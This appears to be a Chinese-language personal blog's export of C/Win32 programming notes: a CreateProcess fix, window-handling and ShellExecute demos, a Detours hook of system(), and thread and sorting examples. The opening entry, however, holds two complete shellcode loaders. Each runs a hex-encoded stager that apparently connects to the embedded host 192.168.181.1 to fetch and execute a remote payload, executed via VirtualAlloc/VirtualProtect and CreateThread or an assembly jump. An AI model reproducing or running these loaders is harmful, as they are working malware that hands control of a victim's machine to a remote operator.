\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    DWORD p;</span><br><span class="line">    VirtualProtect(buf, <span class="keyword">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;p);</span><br><span class="line"></span><br><span class="line">    HANDLE hd =  CreateThread(<span class="number">0</span>, <span class="number">0</span>, buf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hd, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* code = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    CopyMemory(code, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//	CreateThread(0, 0, code, 0, 0, 0);  //或者asm 内联汇编</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">        mov eax, code <span class="comment">//地址</span></span><br><span class="line">            push eax</span><br><span class="line">            ret</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title></a></h4><h4 id="-3"><a href="#-3" class="headerlink" title></a></h4>]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-02_CreateProcess无法创建进程问题解决方法</title>
    <url>/posts/8b05e7a5/</url>
    <content><![CDATA[<p>最近在使用CreateProcess时 无法成功创建进程 参考<a href="https://blog.csdn.net/hany3000/article/details/34622701%E5%BE%97%E7%9F%A5">https://blog.csdn.net/hany3000/article/details/34622701得知</a> <strong>在调用CreateProcess之前，把常量字符串复制到一个临时缓冲区</strong>  </p>
<p><code>CreateProcess(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&amp;info,&amp;pinfo);  </code>改 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCHAR szPath[] = TEXT(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;);</span><br><span class="line">CreateProcess(szPath,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&amp;info,&amp;pinfo);  </span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">//char szCommandLine[] = &quot;notepad&quot;;</span></span><br><span class="line">    STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW; <span class="comment">//指定wShowWindow成员有效</span></span><br><span class="line">    si.wShowWindow = TRUE; <span class="comment">//此成员设为TRUE的话则显示新建进程的主窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//WinExec(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;, SW_SHOW);</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//TCHAR szCommandLine[] = TEXT(&quot;calc&quot;);</span></span><br><span class="line">    TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bRet = CreateProcess(szPath, <span class="comment">//在此指定可执行文件的文件名</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//命令行参数</span></span><br><span class="line">        <span class="literal">NULL</span>,          <span class="comment">//默认进程安全性</span></span><br><span class="line">        <span class="literal">NULL</span>,          <span class="comment">//默认线程安全性</span></span><br><span class="line">        FALSE, <span class="comment">//指定当前进程内句柄不可以被子进程继承</span></span><br><span class="line">        <span class="number">0</span>, <span class="comment">//为新进程创建一个新的控制台窗口  dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//使用本进程的环境变量</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//使用本进程的驱动器和目录</span></span><br><span class="line">        &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bRet) &#123;</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;新进程的ID号：%d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;新进程的主线程ID号：%d\n&quot;</span>, pi.dwThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-01</title>
    <url>/posts/16e8cbb5/</url>
    <content><![CDATA[<h4 id="几个Win32API使用"><a href="#几个Win32API使用" class="headerlink" title="几个Win32API使用"></a>几个Win32API使用</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 消除黑窗口</span></span><br><span class="line"><span class="comment">//#pragma comment(linker, &quot;/subsystem:windows /ENTRY:mainCRTStartup&quot;)  </span></span><br><span class="line"><span class="comment">/* https://blog.csdn.net/zy_505775013/article/details/107432177 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//system(&quot;calc&quot;);</span></span><br><span class="line">    <span class="comment">//HWND win = 0x00080644;</span></span><br><span class="line">    HWND win = <span class="built_in">FindWindowA</span>(<span class="number">0</span>, <span class="string">&quot;title&quot;</span>);</span><br><span class="line">    <span class="comment">//HWND win = FindWindowA(&quot;#32770 (对话框)&quot;, NULL); 这里第一个参数这样设置会找不到</span></span><br><span class="line">    HWND btn = <span class="built_in">FindWindowExA</span>(win, <span class="number">0</span>, <span class="string">&quot;Button&quot;</span>,<span class="string">&quot;Button1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (win == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;没找到&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;找到&quot;</span>, <span class="string">&quot;提示 关闭&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//SendMessageA(btn, WM_CLOSE, 0, 0);// 关闭btn</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">SendMessageA(btn, BM_CLICK, 0 ,0);</span></span><br><span class="line"><span class="comment">SendMessageA(btn, BM_CLICK, 0, 0);  // 点击btn</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnableWindow</span>(btn, <span class="number">0</span>);<span class="comment">//禁用</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">EnableWindow</span>(btn, <span class="number">1</span>);<span class="comment">//启用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//SetWindowPos(win, NULL, 100, 100, 200, 300, 0);</span></span><br><span class="line">    <span class="comment">//else &#123;</span></span><br><span class="line">    <span class="comment">//SetWindowTextA(win, &quot;hhhh&quot;);</span></span><br><span class="line">    <span class="comment">//SetWindowPos(win,NULL,100,100,200,300,0);</span></span><br><span class="line">    <span class="comment">/*while (1) &#123;</span></span><br><span class="line"><span class="comment">ShowWindow(win, SW_HIDE);</span></span><br><span class="line"><span class="comment">Sleep(500);</span></span><br><span class="line"><span class="comment">ShowWindow(win, SW_SHOW);</span></span><br><span class="line"><span class="comment">Sleep(500);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pasue&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 同步： 需要先执行完该操作后才能printf</span></span><br><span class="line">    <span class="comment">//system(&quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;&quot;);  //需要用\进行转移&quot;内的内容</span></span><br><span class="line">    <span class="comment">//printf(&quot;12345&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//异步</span></span><br><span class="line">    <span class="comment">//ShellExecuteA(0, &quot;open&quot;, &quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;&quot;, 0, 0, 0);</span></span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;notepad&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>);	</span><br><span class="line">    <span class="comment">//第一个系统弹出; 第二个表示执行; 第三个表示执行的命令行; 第45默认 ;第六个是0代表窗口隐藏 3最大化 6最小化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">time_t</span> ts;</span><br><span class="line">    <span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(&amp;ts));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> data = <span class="built_in">rand</span>() % <span class="number">4</span>;  <span class="comment">//0 1 2 3 代表四个方位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HWND win = <span class="built_in">FindWindowA</span>(<span class="string">&quot;Chrome_WidgetWin_1&quot;</span>, <span class="string">&quot;新标签页 - Google Chrome&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (win) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                POINT POS1;</span><br><span class="line">                <span class="built_in">GetCursorPos</span>(&amp;POS1);</span><br><span class="line">                <span class="built_in">SetWindowPos</span>(win,<span class="literal">NULL</span>, POS1.x ,POS1.y,<span class="number">400</span>,<span class="number">400</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="built_in">Sleep</span>(<span class="number">50</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HOOK-system"><a href="#HOOK-system" class="headerlink" title="HOOK system"></a>HOOK system</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hook  system()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;detours.h&quot;</span>		<span class="comment">//使用该库去修改函数的地址   找到原地址再去修改成新的</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)	</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//system();  //下面为system函数的定义</span></span><br><span class="line"><span class="comment">//_DCRTIMP int __cdecl system(</span></span><br><span class="line"><span class="comment">//	_In_opt_z_ char const* _Command</span></span><br><span class="line"><span class="comment">//);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*lpold)(			</span><br><span class="line"><span class="type">char</span> <span class="type">const</span>* _Command</span><br><span class="line">) = system;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">newsystem</span><span class="params">(_In_opt_z_ <span class="type">char</span> <span class="type">const</span>* _Command)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;hook&quot;</span>, _Command, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// lpold(_Command);  //挂钩 先执行上面的内容然后在执行原内容</span></span><br><span class="line">    <span class="built_in">lpold</span>(_Command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DetourRestoreAfterWith</span>();<span class="comment">//恢复之前的模式状态  避免反复拦截</span></span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();<span class="comment">//开始劫持</span></span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    <span class="built_in">DetourAttach</span>((<span class="type">void</span>**)&amp;lpold, newsystem);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用指针进行冒泡排序  不会破坏原数据</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = &#123; <span class="number">33</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span>* p[<span class="number">8</span>] = &#123; a,a + <span class="number">1</span>,a + <span class="number">2</span>,a + <span class="number">3</span>,a + <span class="number">4</span>,a + <span class="number">5</span>,a + <span class="number">6</span>,a + <span class="number">7</span> &#125;;   <span class="comment">// 加const后 p 只能读不能修改</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span><span class="number">-1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span> - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (*p[j]&gt;*p[j+<span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span>* lptemp = p[j];</span><br><span class="line">                    p[j] = p[j + <span class="number">1</span>];</span><br><span class="line">                    p[j + <span class="number">1</span>] = lptemp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, *p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">NZ</span><span class="params">(LPVOID  lpparam)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;NNNNNNAAAAATEXT&quot;</span>, <span class="string">&quot;TITLE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">fn</span><span class="params">(<span class="type">void</span>* lp)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* p = lp;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">&quot;第%d个窗口&quot;</span>,*p);  <span class="comment">//打印输出到缓冲区中    </span></span><br><span class="line">    <span class="comment">//格式化函数 第一个参数缓冲区  第二个参数 第三个参数</span></span><br><span class="line">    <span class="comment">// &#x27;sprintf&#x27;: This function or variable may be unsafe. Consider using sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS.</span></span><br><span class="line">    <span class="comment">// 需要在最上方声明  #define  _CRT_SECURE_NO_WARNINGS </span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, str, str, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用createThread创建线程</span></span><br><span class="line">    <span class="comment">//HANDLE hThread; // 线程句柄</span></span><br><span class="line">    <span class="comment">//DWORD dwThreadId;// 保持线程ID</span></span><br><span class="line">    <span class="comment">//for (size_t i = 0; i &lt; 3; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//	hThread = CreateThread(NULL, NULL, NZ, NULL, 0, &amp;dwThreadId);</span></span><br><span class="line">    <span class="comment">//	WaitForSingleObject(hThread, INFINITE);  // 添加该行为异步 否则是同布</span></span><br><span class="line">    <span class="comment">//	CloseHandle(hThread);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//_beginthread 相比与CreateTHread 更好些</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a[<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</span><br><span class="line">            <span class="comment">//_beginthread(fn, 0, &amp;i);  // 第三个参数 </span></span><br><span class="line">            _beginthread(fn, <span class="number">0</span>, &amp;a[i]);	<span class="comment">//三个不同的内存地址值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



